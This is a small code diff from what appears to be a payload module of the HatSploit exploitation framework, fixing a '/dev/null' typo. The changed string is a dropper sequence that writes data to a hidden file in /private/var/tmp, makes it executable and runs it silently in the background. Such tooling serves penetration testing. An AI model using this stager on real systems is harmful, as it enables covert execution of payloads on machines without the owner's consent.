@@ -123,7 +123,7 @@ class HatSploitPayload(HatSploitPayload):
         instructions = ""
         instructions += "cat >/private/var/tmp/.payload;"
         instructions += "chmod +x 777 /private/var/tmp/.payload;"
-        instructions += "sh -c '/private/var/tmp/.payload' 2>/dev/bull &"
+        instructions += "sh -c '/private/var/tmp/.payload' 2>/dev/null &"
         instructions += "\n"
 
         self.payload = payload
